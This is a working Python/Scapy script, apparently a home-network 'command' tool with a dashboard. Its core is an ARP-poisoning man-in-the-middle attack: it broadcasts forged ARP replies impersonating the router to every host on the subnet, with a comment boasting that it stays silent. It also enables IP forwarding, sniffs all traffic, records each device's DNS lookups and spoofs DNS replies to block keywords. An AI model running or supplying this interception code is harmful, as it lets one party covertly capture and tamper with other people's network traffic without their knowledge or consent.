from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time, threading, os, sys
import dashboard

# Global Memory
devices = {}; dns_history = {}; alert_history = []; bandwidth_samples = {}; blocked_devices = set()

# Settings
ROUTER_IP = "192.168.1.1"
BANNED_KEYWORDS = ["porn", "sex", "nude", "xvideo", "adult", "adservice"]

def get_os_by_ttl(ttl):
    if ttl <= 64: return "Android/Linux/Mac"
    if ttl <= 128: return "Windows"
    return "Unknown"

def arp_poison():
    """Tricks the network while remaining silent in terminal"""
    # Use the standard broadcast MAC to stop the Scapy 'destination not found' warnings
    broadcast_mac = "ff:ff:ff:ff:ff:ff"
    while True:
        try:
            # Tell the whole network (pdst) that the router (psrc) is at our MAC
            poison = ARP(op=2, pdst="192.168.1.0/24", hwdst=broadcast_mac, psrc=ROUTER_IP)
            send(poison, verbose=False) # verbose=False keeps the terminal clean
            time.sleep(5)
        except: pass

def packet_callback(pkt):
    if pkt.haslayer(IP):
        src = pkt[IP].src
        
        # INTERNET KILL SWITCH
        if src in blocked_devices:
            return

        if src.startswith("192.168.1.") and src != ROUTER_IP:
            if src not in devices:
                devices[src] = {"mac": pkt.src, "os": get_os_by_ttl(pkt[IP].ttl), "packets": 0}
            
            devices[src]["packets"] += 1
            bandwidth_samples[src] = bandwidth_samples.get(src, 0) + len(pkt)
            
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                try:
                    qname = pkt[DNSQR].qname.decode().lower().rstrip('.')
                    dns_history[src] = qname
                    if any(word in qname for word in BANNED_KEYWORDS):
                        # Redirect to blackhole
                        reply = (IP(dst=src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=0, rdata="0.0.0.0")))
                        send(reply, count=2, verbose=False)
                        alert_history.append({"time": time.strftime("%H:%M:%S"), "type": "BLOCK", "ip": src, "message": f"Killed {qname}"})
                except: pass

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run with sudo!"); sys.exit(1)

    # Sync variables with Dashboard
    dashboard.devices = devices
    dashboard.dns_history = dns_history
    dashboard.alert_history = alert_history
    dashboard.bandwidth_samples = bandwidth_samples
    dashboard.blocked_devices = blocked_devices

    # Enable routing so devices still have internet (unless jailed)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    threading.Thread(target=dashboard.start, daemon=True).start()
    threading.Thread(target=arp_poison, daemon=True).start()
    
    # Bandwidth Reset
    def bw_reset():
        while True:
            time.sleep(1)
            for k in bandwidth_samples: bandwidth_samples[k] = 0
    threading.Thread(target=bw_reset, daemon=True).start()

    print("\n[+] NERO COMMAND PRO v4.0 ACTIVE")
    print("[+] Terminal Warnings: Silenced")
    print("[+] Dashboard: http://192.168.1.50:8080\n")
    
    sniff(prn=packet_callback, store=0)
